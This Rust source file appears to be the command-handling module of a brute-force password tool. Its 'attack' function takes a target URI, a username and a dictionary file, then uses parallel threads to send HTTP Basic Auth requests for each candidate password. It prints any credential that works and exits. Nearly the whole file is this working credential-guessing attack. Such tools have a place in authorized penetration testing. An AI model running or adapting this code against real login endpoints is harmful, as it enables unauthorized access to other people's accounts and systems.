use rayon::prelude::{IndexedParallelIterator, IntoParallelRefIterator, ParallelIterator};

use super::{
    connection::{http_req, BruteResponse},
    console::{print_error, print_help, print_result},
    file::file_to_vec,
};
use std::{collections::HashMap, process};

pub fn execute_command(parsed_command: HashMap<String, String>) {
    let main = parsed_command.get("main");

    match main {
        Some(value) => match value.to_string().as_str() {
            "help" => print_help(),
            command => print_error(format!("Invalid command {}", command)),
        },
        _ => attack(parsed_command),
    }
}

fn attack(parsed_command: HashMap<String, String>) {
    let uri = parsed_command.get("uri").unwrap();
    let username = parsed_command.get("username").unwrap();
    let filename = parsed_command.get("dictionary").unwrap();

    let vec = file_to_vec(&filename).unwrap();

    let chunked_items = vec
        .chunks(num_cpus::get())
        .map(|item| item.iter().map(String::from).collect::<Vec<String>>())
        .collect::<Vec<Vec<String>>>();

    let result = chunked_items
        .par_iter()
        .enumerate()
        .map(|(i, chunck)| process_dictionary(i, username, uri, chunck))
        .reduce_with(|r1, r2| if r1.is_err() { r1 } else { r2 });

    match result.unwrap() {
        Ok(_) => (),
        Err(e) => println!("{}", e),
    }
}

fn process_dictionary(
    idx: usize,
    username: &str,
    uri: &str,
    arc: &Vec<String>,
) -> Result<BruteResponse, String> {
    for password in arc {
        let auth = base64::encode(format!("{}:{}", &username, &password));
        let status = http_req(uri, &auth, username, &password);
        if status.is_ok() {
            let result = status.unwrap();

            print_result(
                idx,
                &result.message,
                &result.uri,
                &result.username,
                &result.password,
                &result.base64,
            );
            process::exit(0x0100);
        } else {
            println!("thread {} | {}:{} ", idx, &username, &password);
        }
    }
    Err("No password found".to_string())
}
